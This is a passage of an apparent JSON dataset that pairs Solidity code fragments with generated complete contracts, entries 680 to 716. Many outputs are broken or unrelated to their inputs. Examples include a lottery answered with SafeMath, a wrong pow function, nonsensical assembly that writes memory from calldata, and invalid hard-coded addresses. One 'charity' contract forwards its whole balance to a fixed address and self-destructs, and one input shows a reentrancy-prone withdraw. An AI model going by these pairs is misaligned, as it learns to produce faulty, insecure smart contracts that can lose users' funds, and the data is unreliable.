        "input": "import \"prb-math/contracts/PRBMathSD59x18.sol\";\n\ncontract SimpleContract {\n\n    using PRBMathSD59x18 for int256;\n\n    function exponential_function(int256 x) public view returns (int256) {\n        int256 z = 90000000000000000;      \n        int256 a = 200000000000000000;     \n        int256 b = 1080000000000000000;    \n        int256 c = -10000000000000000000;  \n        int256 d = 100000000000000000;     \n        int256 _x = x * 1000000000000000000;\n        int256 outcome = PRBMathSD59x18.mul(a, b.pow(PRBMathSD59x18.mul(z, _x) + c)) + d;\n        return outcome;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary PRBMathSD59x18 {\n\n\n  function pow(int256 a, int256 b) internal pure returns (int256) {\n    if (b == 0) {\n       return 1;\n    }\n    int256 c = pow(a, b/2);\n    return PRBMathSD59x18.mul(c, c);\n  }\n\n  function mul(int256 a, int256 b) internal pure returns (int256) {\n    return (a * b) / 1000000000000000000;\n  }\n\n}\n\n"
    },
    "680.sol": {
        "input": "contract WavePortal {\n...\n constructor() payable {\n    console.log(\"Hello, Multiverse... I am Smart Contract WavePortal\");\n  }\n...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract WavePortal {\n    constructor() payable {\n        emit Log(\"Hello, Multiverse... I am Smart Contract WavePortal\");\n    }\n\n    event Log(string message);\n}\n"
    },
    "681.sol": {
        "input": "pragma solidity ^0.4.24;\n\ncontract balance {\n    address owner;\n    mapping(address => uint256) public balances;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function balanceIncrement(address _address) public returns (uint256){\n        require(owner == msg.sender, \"Only owner can increment balances\");\n        return balances[_address]++;\n    }\n\n    function balanceViewIncrement(address _address) public view returns (uint256 value){\n        value = balances[_address];\n        value++;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.24;\n\ncontract balance {\n    address owner;\n    mapping(address => uint256) public balances;\n\n    constructor() public {\n        //  If you declare variables - initialize them\n        owner = msg.sender;\n    }\n\n    //  Returns only if called from another function\n    function balanceIncrement(address _address) public returns (uint256){\n        //  If you initialize owner - check it\n        require(owner == msg.sender, \"Only owner can increment balances\");\n        return balances[_address]++;\n    }\n\n    //  Returns without modifying chain\n    function balanceViewIncrement(address _address) public view returns (uint256 value){\n        value = balances[_address];\n        value++;\n    }\n}\n\n"
    },
    "682.sol": {
        "input": "function transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(address from, address to, uint256 amount) external returns (bool);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20Interface {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "683.sol": {
        "input": "address owner;\n\naddress public owner;\n\ncontract Test {        \n    uint public firstVar=10;\n    uint secondVar=50;\n  }\n\n function returnOwner() public view returns (address){\n        return owner\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    address public owner;\n    uint public firstVar = 10;\n    uint secondVar = 50;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function returnOwner() public view returns (address) {\n        return owner;\n    }\n}\n"
    },
    "684.sol": {
        "input": "contract B {\n    A a = Test(0x123abc...);\n\n    funciton getAddressA() public view returns (address) {\n        return address(a); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    function Test(address _addr) public returns (address) {\n        return _addr; \n    }\n}\n"
    },
    "686.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Escrow {\n    address holder;\n    address admin;\n\n    receive() external payable {}\n\n    function withdraw(uint256 _amount) external {\n        require(msg.sender == holder || msg.sender == admin);\n        payable(msg.sender).transfer(_amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Escrow {\n    address holder;\n    address admin;\n\n    receive() external payable {}\n\n    // only the holder and the admin contract\n    // can pull funds from this escrow account\n    function withdraw(uint256 _amount) external {\n        require(msg.sender == holder || msg.sender == admin);\n        payable(msg.sender).transfer(_amount);\n    }\n}\n\n"
    },
    "687.sol": {
        "input": "function donate() public payable{\n  a.transfer(address(this).balance);\n    selfdestruct(owner);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Donate_Eth_For_Charity {\n\n  address public owner;\n\n  address private a = 0x421457353575317355771110318804984874315;\n\n  function () external payable {\n    selfdestruct(owner);\n  }\n\n  function donate() public payable{\n  a.transfer(address(this).balance);\n    selfdestruct(owner);\n  }\n\n  constructor() public {\n    owner = msg.sender;\n  }\n}\n\n"
    },
    "688.sol": {
        "input": "function getStrings(uint startIndex, uint endIndex) view public returns (string[] memory) \n  { \n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StringStorage {\n\n  function getStrings(uint startIndex, uint endIndex) view public returns (string[] memory) \n  {\n    require(startIndex > 0, \"Invalid start index\");\n    require(endIndex <= 0xFFFFFFFF, \"End index exceeds limit\");\n    \n    assembly {\n      mstore(calldataload(0), 0)\n      mstore(calldataload(1), calldataload(2))\n      mstore(calldataload(3), calldataload(4))\n      mstore(calldataload(5), calldataload(6))\n      mstore(calldataload(7), 0)\n      mstore(calldataload(8), 0)\n      mstore(calldataload(9), 0)\n    }\n  }\n}\n\n"
    },
    "690.sol": {
        "input": "using SafeMath for uint256;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n}\n\n"
    },
    "691.sol": {
        "input": "    mapping (uint => address) players;\n    uint playersCount=0;\n\nfunction enter() public payable {    \n            playersCount++;\n            players[playersCount]=payable(msg.sender);       \n        }               \n           \n\n       function pickWinner() public onlyowner returns (address payable) {\n            require(address(this).balance>0,\"Please upload balance\");\n            uint index = getRandomNumber() % playersCount;\n            address payable winner=payable(players[index]);\n            \n            lotteryHistory[lotteryId] = winner;\n            lotteryId++;\n    \n            for (uint i=0; i< playersCount ; i++) {\n                 delete players[i];\n            }     \n            return winner   ;   \n        }\n\n   lotteryId => playersCount => address\n\n  1 => playersCount => address\n\n 2 => playersCount => address\n\nfunction enter() public payable {    \n            playersCount++;\n            players[lotteryId][playersCount]=msg.sender;       \n        }         \n\n\n",
        "output": "pragma solidity ^0.4.25;\nlibrary SafeMath {\n    \n    function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        assert(c / a == b);\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal constant returns (uint256) {\n        uint256 c = a / b;\n        return c;\n    }    \n}\n\n"
    },
    "692.sol": {
        "input": "pragma solidity >=0.6.0 <0.9.0;\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Token {\n  string public name = \"Token\";\n  string public symbol = \"TOK\";\n  uint public totalSupply = 1*10**(18) * 10**(12);\n  uint public decimals = 18;\n  address public owner = 0x063214833299078683915273043052825586669;\n}\n\n"
    },
    "693.sol": {
        "input": "function add_task(string memory _name) public {\n    tasksStruct memory newTask = tasksStruct(_name, uint32(now), false);\n    tasks.push(newTask);\n}\n\nfunction show_opened_tasks() public view returns (uint) {\n    uint count_of_opened_tasks = 0;\n    for (uint i=0; i<tasks.length; i++){\n        if (!tasks[i].is_done) {\n            count_of_opened_tasks += 1; \n        }\n    }\n    \n    return count_of_opened_tasks;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract TasksStore {\n    struct tasksStruct {\n        string name;\n        uint start;\n        bool is_done;\n    }\n    \n    tasksStruct[] public tasks;\n    \n    function add_task(string memory _name) public {\n        tasksStruct memory newTask = tasksStruct(_name, uint32(now), false);\n        tasks.push(newTask);\n    }\n    \n    function show_opened_tasks() public view returns (uint) {\n        uint count_of_opened_tasks = 0;\n        for (uint i=0; i<tasks.length; i++){\n            if (!tasks[i].is_done) {\n                count_of_opened_tasks += 1; \n            }\n        }\n        \n        return count_of_opened_tasks;\n    }\n}\n\n"
    },
    "694.sol": {
        "input": "function send_usdt(address _to, uint256 _amount) external returns (string memory) {\n    IERC20 usdt = IERC20(address(0xfe4F5145f6e09952a5ba9e956ED0C25e3Fa4c7F1));\n    require(_amount > 1, \"Purchases must be higher than 1 usdt\");\n\n    usdt.transferFrom(msg.sender, owner, 1);\n    usdt.transferFrom(msg.sender, _to, _amount-1);\n\n    return \"Payment successful!\";  \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint256 value) external returns (bool);\n    function balanceOf(address who) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    function approve(address spender, uint256 value) external returns (bool);\n    function totalSupply() external view returns (uint256);\n    function decimals() external view returns (uint8);\n}\n\ncontract PayTo {\n    IERC20 usdt = IERC20(address(0xfe4F5145f6e09952a5ba9e956ED0C25e3Fa4c7F1));\n    \n    function send_usdt(address _to, uint256 _amount) external returns (string memory) {\n        require(_amount > 1, \"Purchases must be higher than 1 usdt\");\n\n        usdt.transferFrom(msg.sender, owner, 1);\n        usdt.transferFrom(msg.sender, _to, _amount-1);\n\n        return \"Payment successful!\";  \n    }\n    \n    address owner = msg.sender;\n}\n\n"
    },
    "696.sol": {
        "input": "AGGREGATOR_ADDRESS=0xD4a33860578De61DBAbDc8BFdb98FD742fA7028e\n\nrequire(\"dotenv\").config();\nconst hre = require(\"hardhat\");\n\nasync function main() {\n    const factory = await hre.ethers.getContractFactory(\"Example\");\n    const contract = await factory.deploy(process.env.AGGREGATOR_ADDRESS);\n    await contract.deployed();\n}\n\nmain().catch((error) => {\n    console.error(error);\n    process.exitCode = 1;\n});\n\npragma solidity ^0.8;\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ncontract Example {\n    AggregatorV3Interface internal priceFeed;\n\n    constructor(address _aggregator) {\n        priceFeed = AggregatorV3Interface(_aggregator);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface AggregatorV3Interface {\n    function decimals() external view returns (uint8);\n    function price(uint256) external view returns (uint256);\n}\n\n"
    },
    "697.sol": {
        "input": "\npragma solidity >=0.8.0 <0.9.0;\n\n\nlibrary BytesLib {  \n  function slice(\n        bytes memory _bytes,\n        uint256 _start,\n        uint256 _length\n    )\n        internal\n        pure\n        returns (bytes memory)\n    {\n        require(_length + 31 >= _length, \"slice_overflow\");\n        require(_bytes.length >= _start + _length, \"slice_outOfBounds\");\n\n        bytes memory tempBytes;\n\n        assembly {\n            switch iszero(_length)\n            case 0 {\n                tempBytes := mload(0x40)\n\n                let lengthmod := and(_length, 31)\n\n                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n                let end := add(mc, _length)\n\n                for {\n                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n                } lt(mc, end) {\n                    mc := add(mc, 0x20)\n                    cc := add(cc, 0x20)\n                } {\n                    mstore(mc, mload(cc))\n                }\n\n                mstore(tempBytes, _length)\n\n                mstore(0x40, and(add(mc, 31), not(31)))\n            }\n            default {\n                tempBytes := mload(0x40)\n                mstore(tempBytes, 0)\n\n                mstore(0x40, add(tempBytes, 0x20))\n            }\n        }\n\n        return tempBytes;\n    }\n}\n\n\n",
        "output": "\npragma solidity >=0.8.0 <0.9.0;\n\n\nlibrary BytesLib {  \n  function slice(\n        bytes memory _bytes,\n        uint256 _start,\n        uint256 _length\n    )\n        internal\n        pure\n        returns (bytes memory)\n    {\n        require(_length + 31 >= _length, \"slice_overflow\");\n        require(_bytes.length >= _start + _length, \"slice_outOfBounds\");\n\n        bytes memory tempBytes;\n\n        // Check length is 0. `iszero` return 1 for `true` and 0 for `false`.\n        assembly {\n            switch iszero(_length)\n            case 0 {\n                // Get a location of some free memory and store it in tempBytes as\n                // Solidity does for memory variables.\n                tempBytes := mload(0x40)\n\n                // Calculate length mod 32 to handle slices that are not a multiple of 32 in size.\n                let lengthmod := and(_length, 31)\n\n                // tempBytes will have the following format in memory: <length><data>\n                // When copying data we will offset the start forward to avoid allocating additional memory\n                // Therefore part of the length area will be written, but this will be overwritten later anyways.\n                // In case no offset is require, the start is set to the data region (0x20 from the tempBytes)\n                // mc will be used to keep track where to copy the data to.\n                let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n                let end := add(mc, _length)\n\n                for {\n                    // Same logic as for mc is applied and additionally the start offset specified for the method is added\n                    let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n                } lt(mc, end) {\n                    // increase `mc` and `cc` to read the next word from memory\n                    mc := add(mc, 0x20)\n                    cc := add(cc, 0x20)\n                } {\n                    // Copy the data from source (cc location) to the slice data (mc location)\n                    mstore(mc, mload(cc))\n                }\n\n                // Store the length of the slice. This will overwrite any partial data that \n                // was copied when having slices that are not a multiple of 32.\n                mstore(tempBytes, _length)\n\n                // update free-memory pointer\n                // allocating the array padded to 32 bytes like the compiler does now\n                // To set the used memory as a multiple of 32, add 31 to the actual memory usage (mc) \n                // and remove the modulo 32 (the `and` with `not(31)`)\n                mstore(0x40, and(add(mc, 31), not(31)))\n            }\n            // if we want a zero-length slice let's just return a zero-length array\n            default {\n                tempBytes := mload(0x40)\n                // zero out the 32 bytes slice we are about to return\n                // we need to do it because Solidity does not garbage collect\n                mstore(tempBytes, 0)\n\n                // update free-memory pointer\n                // tempBytes uses 32 bytes in memory (even when empty) for the length.\n                mstore(0x40, add(tempBytes, 0x20))\n            }\n        }\n\n        return tempBytes;\n    }\n}\n\n"
    },
    "698.sol": {
        "input": "solidity: {\n   compilers: [\n     {\n        version: \"0.8.8\",\n      },\n      {\n         version: \"0.7.0\",\n      },\n     ],\n }\n  \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n\n  constructor() {\n    emit NewTokensMinted(msg.sender, 10000000000000000000000000);\n  }\n\n  event NewTokensMinted(address indexed to, uint256 amount);\n}\n\n"
    },
    "699.sol": {
        "input": "function divisionRoundUp(uint256 x, uint256 y) pure returns (uint256 z) {\n  z = (x + (y / 2) / y)\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MathLib {\n  function divisionRoundUp(uint256 x, uint256 y) pure returns (uint256 z) {\n    z = (x + (y / 2) / y);\n  }\n}\n\n"
    },
    "700.sol": {
        "input": "function withdraw(uint256 _amount) external {\n    balances[msg.sender] -= _amount;\n    (bool success, ) = payable(msg.sender).call{value: _amount}(\"\");\n}\n\n(bool success, ) = payable(msg.sender).call{value: _amount}(\"\");\nrequire(success);\n\nfunction withdraw(uint256 _amount) external {\n    balances[msg.sender] -= _amount;\n    payable(msg.sender).transfer(_amount);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    interface IERC20 {\n    \n    function transfer(address to, uint256 value) external returns ( bool );\n    \n    function approve(address spender, uint256 value) external returns ( bool );\n    \n    function transferFrom(address from, address to, uint256 value) external returns ( bool );\n    \n    function allowance(address owner, address spender) external view returns (uint256 );\n    \n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    \n    event Transfer(address indexed from, address indexed to, uint256 value);\n    \n    }\n\n"
    },
    "701.sol": {
        "input": " function createUser( string memory _userName) public {\n    MyUser memory user;\n    user.publicKey = msg.sender;\n    user.userName = _userName;\n    users.push(user);\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserList {\n\n    struct MyUser {\n        address publicKey;\n        string userName;\n    }\n\n    MyUser[] public users;\n\n    function createUser( string memory _userName) public {\n    MyUser memory user;\n    user.publicKey = msg.sender;\n    user.userName = _userName;\n    users.push(user);\n    }\n\n}\n\n"
    },
    "702.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\ncontract MyCollection is ERC721 {\n    constructor() ERC721(\"MyCollection\", \"MyC\") {\n        _mint(msg.sender, 1);\n    }\n\n    bool locked = false;\n\n    function setLocked(bool _locked) external {\n        locked = _locked;\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        require(!locked, \"Cannot transfer - currently locked\");\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721 {\n    function safeMint(address to, uint256 tokenId) external;\n}\n\n"
    },
    "703.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Lottery {\n\n    address[] public s_players;\n\n    function enterLottery(uint tickets) public payable returns (address[] memory) {\n\n        uint lotteryCost = _tickets * 25 ether / 100;\n        address sender = msg.sender;\n        require(msg.value >= lotteryCost, 'Ticket cant be purchased');\n\n        for (uint x = 0; x < _tickets; x++){\n            s_players.push(payable(sender));\n            \n        }\n        \n        return s_players;\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n  function add(uint a, uint b) internal pure returns (uint) {\n    uint c = a + b;\n    require(c >= a, \"SafeMath: addition overflow\");\n    return c;\n  }\n\n  function subtract(uint a, uint b) internal pure returns (uint) {\n    uint c = a - b;\n    require(c >= a, \"SafeMath: subtraction underflow\");\n    return c;\n  }\n\n  function multiply(uint a, uint b) internal pure returns (uint) {\n    uint c = a * b;\n    require(c / a == b, \"SafeMath: multiplication overflow\");\n    return c;\n  }\n\n  function divide(uint a, uint b) internal pure returns (uint) {\n    require(b > 0, \"SafeMath: division by zero\");\n    return a / b;\n  }\n}\n\n"
    },
    "704.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\ncontract t1{\n    mapping(address => uint256[]) AllSpecialNFT;\n    function addNewVal(address _off, uint _tokenId) public {\n        AllSpecialNFT[_off].push(_tokenId);\n    }\n    function findSize(address _off) public view returns(uint){\n        return AllSpecialNFT[_off].length;\n    }\n    \n}\npragma solidity >=0.4.22 <0.9.0;\nimport './t1.sol';\ncontract t2 {\n    t1 _t1;\n    constructor(t1 t1_){\n        _t1 = t1_;\n    }\n    \n    function callandAdd(uint _tokenId) public{\n        _t1.addNewVal(msg.sender,_tokenId);\n    }\n    \n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract t1 {\n    mapping(address => uint256[]) AllSpecialNFT;\n    function addNewVal(address _off, uint _tokenId) public {\n        AllSpecialNFT[_off].push(_tokenId);\n    }\n    function findSize(address _off) public view returns(uint){\n        return AllSpecialNFT[_off].length;\n    }\n    \n}\n\ncontract t2 {\n    t1 _t1;\n    constructor(t1 t1_ ){\n        _t1 = t1_;\n    }\n    \n    function callandAdd(uint _tokenId) public{\n        _t1.addNewVal(msg.sender,_tokenId);\n    }\n    \n    \n}\n\n"
    },
    "705.sol": {
        "input": " enum VotingOption {\n    Confirmed,\n    Abstention\n}\n\nstruct Votes {\n    uint256 total;\n    uint256 totalPercentage;\n}\n\nstruct Elector {\n    address wallet;\n    VotingOption votingOption;\n    \n}\n\nstruct Candidate {\n    uint256 number;\n    string avatar;\n    Votes confirmedVotes;\n}\n\ncontract ElectronicVotingMachine {\n\nmapping (address => Elector) public electorsWhoVoted;\n\nVotes abstentionVotes = Votes({ total: 0, totalPercentage: 0 });\nElector[] electors;\nCandidate[] candidates;\nstring[] candidateAvatar = [\n    \"https:\n    \"https:\n    \"https:\n    \"https:\n    \"https:\n    \"https:\n];\n\nfunction _createCandidates() private {\n    for(uint256 index = 0; index <= 6; index++) {\n        candidates.push(Candidate({\n            number: index + 1,\n            avatar: candidateAvatar[index],\n            confirmedVotes: Votes({ total: 0, totalPercentage: 0 })\n        }));\n    }\n}\n\nconstructor() {\n    _createCandidates();\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ElectronicVotingMachine {\n    enum VotingOption {\n        Confirmed,\n        Abstention\n    }\n\n    struct Votes {\n        uint256 total;\n        uint256 totalPercentage;\n    }\n\n    struct Elector {\n        address wallet;\n        VotingOption votingOption;\n    }\n\n    struct Candidate {\n        uint256 number;\n        string avatar;\n        Votes confirmedVotes;\n    }\n\n    mapping (address => Elector) public electorsWhoVoted;\n\n    Votes abstentionVotes = Votes({ total: 0, totalPercentage: 0 });\n    Elector[] public electors;\n    Candidate[] public candidates;\n    string[] candidateAvatar = [\n        \"https://example.com/avatar1\",\n        \"https://example.com/avatar2\",\n        \"https://example.com/avatar3\",\n        \"https://example.com/avatar4\",\n        \"https://example.com/avatar5\",\n        \"https://example.com/avatar6\"\n    ];\n\n    function _createCandidates() private {\n        for(uint256 index = 0; index < 6; index++) {\n            candidates.push(Candidate({\n                number: index + 1,\n                avatar: candidateAvatar[index],\n                confirmedVotes: Votes({ total: 0, totalPercentage: 0 })\n            }));\n        }\n    }\n\n    constructor() public {\n        _createCandidates();\n    }\n}\n\n"
    },
    "706.sol": {
        "input": "if (userDetails[i].id == _id) {\n    userDetails[i] = userDetails[userDetails.length-1];\n    userDetails.pop();\n    break;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserStorage {\n    uint[4] public idUserStorage;\n    mapping(address => UserStorageUser) public userDetails;\n\n    struct UserStorageUser {\n        address id;\n        uint256 timestamp;\n        uint256 bal;\n        uint8 index;\n    }\n}\n\n"
    },
    "707.sol": {
        "input": "compilers: {\n    solc: {\n      version: \"0.8.4\",\n\n    }\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n  \n  function multiply(uint256 a, uint256 b) public returns (uint256) {\n    return a * b;\n  }\n}\n\n"
    },
    "708.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Info {\n        uint64 lastused;\n        uint256 limit;\n        string comment;\n        address[] allowedTo;\n    }\n\n    mapping (address => Info) public users;\n\n    function setUser(address user, uint64 lastused, uint256 limit, string calldata comment, address[] calldata allowedTo) external {\n        users[user] = Info(lastused, limit, comment, allowedTo);\n    }\n}\n\nfunction getAllowedTo(address user) external view returns (address[] memory) {\n    return users[user].allowedTo;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Info {\n        uint64 lastused;\n        uint256 limit;\n        string comment;\n        address[] allowedTo;\n    }\n\n    mapping (address => Info) public users;\n\n    function setUser(address user, uint64 lastused, uint256 limit, string calldata comment, address[] calldata allowedTo) external {\n        users[user] = Info(lastused, limit, comment, allowedTo);\n    }\n\n    function getAllowedTo(address user) external view returns (address[] memory) {\n        return users[user].allowedTo;\n    }\n}\n\n"
    },
    "709.sol": {
        "input": "struct Game {\n    address host; \n    uint gameId; \n    uint buyinRequirement; \n    uint etherWithdrawalReqs; \n    uint gamePot; \n    uint8 tableWithdrawalReqs; \n    uint8 playerCount; \n    uint8 verifiedWithdrawalReqs; \n    bool endedBuyin; \n    bool isActive; \n    address[] playerList; \n}\n\nfunction startGame(string memory name, uint buyinReq) public payable isNotInGame {     \n    require(initFee == .001 ether, \"In order to prevent spam games that never resolve, each game initialization will cost  ether.\");\n    addFeesPending();\n    playerInfo[msg.sender] = Player(name, gameNumber, 0, 0, false, false, false, false, true);\n    address[] memory add;\n    idToGame[gameNumber] = Game(msg.sender, gameNumber, buyinReq, 0, 0, 0, 0, 0, false, true, add);\n    idToGame[gameNumber].playerList.push(msg.sender);\n    games.push(idToGame[gameNumber]);\n    incGameNumber();\n}    \n\nfunction getGameInfo(uint id) public view returns (Game memory) {\n    return idToGame[id];\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GameContract {\n    struct Game {\n        address host;\n        uint gameId;\n        uint buyinRequirement;\n        uint etherWithdrawalReqs;\n        uint gamePot;\n        uint8 tableWithdrawalReqs;\n        uint8 playerCount;\n        uint8 verifiedWithdrawalReqs;\n        bool endedBuyin;\n        bool isActive;\n        address[] playerList;\n    }\n\n    struct Player {\n        string name;\n        uint gameId;\n        uint balance;\n        uint pendingWithdrawal;\n        bool isActive;\n        bool isHost;\n        bool hasEndedBuyin;\n        bool hasWithdrawn;\n        bool isInGame;\n    }\n\n    uint public gameNumber = 0;\n    uint public initFee = 0.001 ether;\n    Game[] public games;\n    mapping(uint => Game) public idToGame;\n    mapping(address => Player) public playerInfo;\n\n    modifier isNotInGame {\n        require(!playerInfo[msg.sender].isInGame, \"Player already in a game\");\n        _;\n    }\n    \n    function addFeesPending() internal {\n        playerInfo[msg.sender].balance += msg.value;\n    }\n\n    function incGameNumber() internal {\n        gameNumber++;\n    }\n    \n    function startGame(string memory name, uint buyinReq) public payable isNotInGame {     \n        require(msg.value >= initFee, \"In order to prevent spam games that never resolve, each game initialization will cost  ether.\");\n        addFeesPending();\n        playerInfo[msg.sender] = Player(name, gameNumber, msg.value, 0, false, false, false, false, true);\n        address[] memory add;\n        idToGame[gameNumber] = Game(msg.sender, gameNumber, buyinReq, 0, 0, 0, 0, 0, false, true, add);\n        idToGame[gameNumber].playerList.push(msg.sender);\n        games.push(idToGame[gameNumber]);\n        incGameNumber();\n    }    \n\n    function getGameInfo(uint id) public view returns (Game memory) {\n        return idToGame[id];\n    }\n}\n\n"
    },
    "710.sol": {
        "input": "address [] addresses;\n\naddresses.push(newGameAddress);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GamingAddressCollector {\n\n    address [] addresses;\n\n    function addAddress(address newGameAddress) public {\n        addresses.push(newGameAddress);\n    }\n\n}\n\n"
    },
    "711.sol": {
        "input": "Reader[] public readers;\n\nreaders.push(Reader(\"Freddie\", 0, books[0]));\n\ncontract CoolSchool {\n    mapping(string => string) public books; \n    mapping(string => string[]) public readers; \n\n    constructor() {\n        _loadBooks();\n    }\n\n    function addBook(string memory isbn, string memory title) public {\n        require(!_isEmpty(isbn), \"isbn is required\");\n        require(!_isEmpty(title), \"title is required\");\n        books[isbn] = title;\n    }\n\n    function addReadBook(string memory reader, string memory isbn) public {\n        string[] storage read = readers[reader];\n        require(!_isEmpty(books[isbn]), \"unknown book\");\n        read.push(isbn);\n    }\n\n    function _loadBooks() private {\n        books[\"0333791037\"] = \"The Great Gatsby\";\n        books[\"0684833395\"] = \"Catch-22\";\n        books[\"9780451524935\"] = \"1984\";\n    }\n\n    function _isEmpty(string memory s) private pure returns (bool) {\n        return bytes(s).length == 0;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Reader {\n    function getReadBooks() external view returns (string[] memory);\n}\n\ncontract CoolSchool {\n    mapping(string => string) public books; \n    mapping(string => string[]) public readers; \n\n    constructor() {\n        _loadBooks();\n    }\n\n    function addBook(string memory isbn, string memory title) public {\n        require(!_isEmpty(isbn), \"isbn is required\");\n        require(!_isEmpty(title), \"title is required\");\n        books[isbn] = title;\n    }\n\n    function addReadBook(string memory reader, string memory isbn) public {\n        string[] storage read = readers[reader];\n        require(!_isEmpty(books[isbn]), \"unknown book\");\n        read.push(isbn);\n    }\n\n    function _loadBooks() private {\n        books[\"0333791037\"] = \"The Great Gatsby\";\n        books[\"0684833395\"] = \"Catch-22\";\n        books[\"9780451524935\"] = \"1984\";\n    }\n\n    function _isEmpty(string memory s) private pure returns (bool) {\n        return bytes(s).length == 0;\n    }\n}\n\n"
    },
    "713.sol": {
        "input": "contract Ballot {\n\n    receive() external payable {\n    }\n}\n\ncontract Ballot {\n\n    fallback() external payable {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC20 {\n\n  function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract Ballot {\n  \n  \n  \n  \n  function fallback() external payable {\n    if (msg.value > 0) {\n      IERC20(0x1f3639248e10374230422023761c154476c20112).transfer(\n        address(this),\n        msg.value\n      );\n    }\n  }\n}\n\n"
    },
    "714.sol": {
        "input": "  beforeEach(async function () {\n    Token = await ethers.getContractFactory(\"Token\")\n    token = await token.deploy()\n  })\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Token {\n  string public name;\n  string public symbol;\n  uint public decimals;\n  uint public totalSupply;\n\n  constructor() public {\n    name = \"Safety Token\";\n    symbol = \"SAFETY\";\n    decimals = 18;\n    totalSupply = 1000000000000000000000000000000;\n    \n  }\n}\n\n"
    },
    "715.sol": {
        "input": "function topUpSubscription(uint256 amount) external onlyOwner {\n    LINKTOKEN.transferAndCall(address(COORDINATOR), amount, abi.encode(s_subscriptionId));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ILinkToken {\n    function transferAndCall(address to, uint256 value, bytes calldata data) external returns (bool);\n}\n\ncontract MyContract {\n    address public owner;\n    address public coordinator;\n    uint256 public subscriptionId;\n\n    ILinkToken public linkToken;\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Caller is not the owner\");\n        _;\n    }\n\n    constructor(address _linkTokenAddress, address _coordinatorAddress) {\n        owner = msg.sender;\n        linkToken = ILinkToken(_linkTokenAddress);\n        coordinator = _coordinatorAddress;\n    }\n\n    function topUpSubscription(uint256 amount) external onlyOwner {\n        linkToken.transferAndCall(coordinator, amount, abi.encode(subscriptionId));\n    }\n}\n"
    },
    "716.sol": {
        "input": "it('Should correctly set totalSupply to: 1T', async () => {\n    const totalSupply = await hardhatToken.totalSupply();\n    const decimals = ethers.BigNumber.from(10).pow(9);\n\n    expect(totalSupply).to.equal(\n        ethers.BigNumber.from(1_000_000_000_000).mul(decimals)\n    );\n});\n\n\n",
